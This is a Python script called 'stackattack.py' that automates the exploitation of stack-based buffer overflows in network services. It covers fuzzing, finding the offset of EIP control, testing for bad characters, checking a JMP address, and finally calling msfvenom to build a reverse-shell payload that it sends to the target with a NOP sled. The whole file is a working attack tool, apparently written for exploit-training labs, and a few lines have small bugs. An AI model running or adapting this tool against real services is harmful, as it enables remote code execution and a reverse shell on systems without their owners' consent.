'''
Author: Michael Catanzaro
Version History:
01/28/2021 - Rev. 1 Initial Release
'''
#!/usr/bin/env python3

import os
import socket
import time
import sys
import argparse
import subprocess

def msg(name=None):
    return '''stackattack.py
        Fuzzing function:
        [-f -t TARGET -p PORT -s SIZE]
        Pattern function:
        [-P -t TARGET -p PORT -s SIZE]
        Offset function:
        [-o -s SIZE]
        EIP Control function:
        [-e -t TARGET -p PORT -s SIZE]
        Bad Characters function:
        [-b -t TARGET -p PORT -s SIZE]
        JMP function:
        [-j -t TARGET -p PORT -s SIZE]
        Shell function:
        [-S -t TARGET -p PORT -s SIZE]
        '''

def main():
    sub = False
    parser = argparse.ArgumentParser(description="StackAttack - python module for attacking stack-based buffer overflows.", usage=msg())
    parser.add_argument("-t", "--target", help="Host IP to attack.", type=str)
    parser.add_argument("-p", "--port", help="Host port running service to attack.", type=int)
    parser.add_argument("-f", "--fuzz", help="Fuzz service to find crash point.", action="store_true")
    parser.add_argument("-s", "--size", help="Size of buffer to send in bytes. Also used for pattern creation and filler bytes", type=int)
    parser.add_argument("-i", "--increment", help="Incremental increase of buffer in bytes.", type=int, default=100)
    parser.add_argument("-P", "--pattern", help="Run msf-pattern_create and send pattern to target.", action="store_true")
    parser.add_argument("-o", "--offset", help="Find offset using EIP gained from pattern module.", action="store_true")
    parser.add_argument("-e", "--eipcontrol", help="Send buffer to confirm control of EIP.", action="store_true")
    parser.add_argument("-b", "--badchars", help="Send full list of hex characters to find forbidden charcters.", action="store_true")
    parser.add_argument("-j", "--jmp", help="Confirm JMP address for shell code.", action="store_true")
    parser.add_argument("-S", "--shell", help="Generate shellcode with msfvenom and send to target.", action="store_true")
    parser.add_argument("-n", "--nops", help="Number of nops to add to payload in shell module.", type=int)
    args = parser.parse_args()
    host = args.target
    port = args.port
    size = args.size
    increment = args.increment
    nops = args.nops

    if args.fuzz == True:
        if args.target and args.port and args.size is not None:
            fuzz(host, port, size, increment)
        else:
            parser.error("Fuzz requires target, port, and size. See usage.") 

    if args.pattern == True:
        if args.target and args.port and args.size is not None:
            pattern(host, port, size)
        else:
            parser.error("Pattern requires target, port, and size. See usage.")

    if args.offset == True:
        if args.size is not None:
            offset(size)
        else:
            parser.error("Offset requires size. See usage.")

    if args.eipcontrol == True:
        if args.target and args.port and args.size is not None:
            eipcontrol(host, port, size)
        else:
            parser.error("EIP Control requires target, port, and size. See usage.")
    
    if args.badchars == True:
        if args.target and args.port and args.size is not None:
            badchars(host, port, size)
        else:
            parser.error("Bad Characters requires target, port, and size. See usage.")
    
    if args.jmp == True:
        if args.target and args.port and args.size is not None:
            jmp(host, port, size)
        else:
            parser.error("JMP requires host, port, and size. See usage.")

    if args.shell == True:
        if args.target and args.port and args.size is not None:
            shell(host, port, size, nops)
        else:
            parser.error("Shell requires host, port, and size. See usage.")
    if len(sys.argv)==1:
        parser.print_help()
        parser.exit()

def fuzz(host, port, size, increment):
    while(size < 10000):
        try:
            print("\n[+]Sending buffer with %s bytes[+]" % size)
            buffer = b"A" * size
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))    
            s.recv(1024)
            s.send(buffer)
            s.recv(1024)
            s.close() 
            time.sleep(2)
            size +=increment

        except:
            print("\n[!]Could not connect! Either the host is down or you crashed the application. Check your debugger[!]")
            sys.exit()

def pattern(host, port, size):
    try:
        buffer = subprocess.getoutput(['msf-pattern_create -l {}'.format(size)])
        buffer_bytes = str.encode(buffer)       
        print("\n[+]Sending generated patten. Check debugger for EIP[+]") 
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        connect = s.connect((host, port))    
        s.recv(1024)
        s.send(buffer_bytes)
        s.recv(1024)
        s.close()
    except:
        print("\n[!]Could not connect! Either the host is down or you crashed the application. Check your debugger[!]")


def offset(size):
    eip = input("Please enter the EIP address: ")
    offset = subprocess.getoutput(['msf-pattern_offset -l {} -q {}'.format(size, eip)])
    print(offset)

def eipcontrol(host, port, size):
    try:
        print("\n[+]Sending buffer in attempt to control EIP. Check your debugger[+]")
        filler = b"A" * size
        eip = b"B" * 4
        buffer = filler + eip
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        connect = s.connect((host, port))    
        s.recv(1024)
        s.send(buffer)
        s.recv(1024)
        s.close() 
    except:
        print("\n[!]Could not connect! Either the host is down or you crashed the application. Check your debugger[!]")

def badchars(host, port, size):
    try:
        filler = b"A" * size
        eip = b"B" * 4
        n = input("Please enter the number of characters you wish to exclude (0-10): ")
        info = input("Character formats are in hexadecimal format and case sensitive i.e. 01 or 9F. 00 is excluded by default. Press enter to continue...")
        if n == "0":
            with open('chars.txt', 'r') as f:\
                eip = f.read()
            eip_bytes = bytes.fromhex(eip)
        elif n == "1":
            forbidden = input("Enter forbidden character: " )
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "2":
            forbidden1 = input("Enter first forbidden character: " )
            forbidden2 = input("Enter second forbidden character: " )
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "3":
            forbidden1 = input("Enter first forbidden character: " )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "4":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "5":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "6":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            forbidden6 = input("Enter sixth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '').replace(forbidden6, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "7":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            forbidden6 = input("Enter sixth forbidden character: ")
            forbidden7 = input("Enter seventh forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '').replace(forbidden6, '').replace(forbidden7, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "8":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            forbidden6 = input("Enter sixth forbidden character: ")
            forbidden7 = input("Enter seventh forbidden character: ")
            forbidden8 = input("Enter eighth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '').replace(forbidden6, '').replace(forbidden7, '').replace(forbidden8, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "9":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            forbidden6 = input("Enter sixth forbidden character: ")
            forbidden7 = input("Enter seventh forbidden character: ")
            forbidden8 = input("Enter eighth forbidden character: ")
            forbidden9 = input("Enter ninth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '').replace(forbidden6, '').replace(forbidden7, '').replace(forbidden8, '').replace(forbidden9, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "10":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            forbidden6 = input("Enter sixth forbidden character: ")
            forbidden7 = input("Enter seventh forbidden character: ")
            forbidden8 = input("Enter eighth forbidden character: ")
            forbidden9 = input("Enter ninth forbidden character: ")
            forbidden10 = input("Enter tenth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '').replace(forbidden6, '').replace(forbidden7, '').replace(forbidden8, '').replace(forbidden9, '').replace(forbidden10, '')
            eip_bytes = bytes.fromhex(eip)
        else:
            print("Please enter a valid number (0-10)")
            exit
        
        print("\n[+]Sending buffer to find bad characters. Check your debugger. Remove detected characters from badchars.txt and send again until sucessful[+]")
        buffer = filler + eip_bytes
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        connect = s.connect((host, port))
        s.recv(1024)
        s.send(buffer)
        s.recv(1024)
        s.close()
    
    except:
        print("\n[!]Could not connect! Either the host is down or you crashed the application. Check your debugger[!]")

def jmp(host, port, size):
    try:
        filler = b"A" * size
        eip = input("Enter JMP address in hexadecimal format i.e. \\x00\\x01 = 0102: " )
        eip_bytes = bytes.fromhex(eip)
        buffer = filler + eip_bytes 
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        connect = s.connect((host, port))
        s.recv(1024)
        s.send(buffer)
        s.recv(1024)
        s.close
    except:
        print("\n[!]Could not connect! Either the host is down or you crashed the application. Check your debugger[!]")

def shell(host, port, size, nops):
    try:
        filler = b"A" * size
        eip = input("Enter JMP address in hexadecimal format: " )
        eip_bytes = bytes.fromhex(eip)
        payload = input("Enter payload:" )
        lhost = input("Enter ip for reverse shell: " )
        lport = input("Enter port for reverse shell: ")
        badchars = input("Enter forbidden characters for payload: " )
        nopsled = "90" * nops
        nop_bytes = bytes.fromhex(nopsled)
        msfpayload = subprocess.getoutput(['msfvenom -p {} LHOST={} LPORT={} EXITFUNC=thread -f raw -b {} --smallest -o payload.txt'.format(payload, lhost, lport, badchars, nops)])
        with open('payload.txt', 'rb') as f:
            shell = f.read()
        print("Payload used for debugging purposes: %s" % shell)
        info = input("[+]Open metasploit multi handler exploit module and and listen on address: {} port: {}. Set payload as {}. Press enter when ready...[+]".format(lhost, lport, payload))
        buffer = filler + eip_bytes + nop_bytes + shell
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        connect = s.connect((host, port))
        s.recv(1024)
        s.send(buffer)
        s.recv(1024)
        s.close()
    except:
        print("\n[!]Could not connect! Either the host is down or you crashed the application. Check your debugger and listener[!]")

if __name__ == "__main__":
    main()
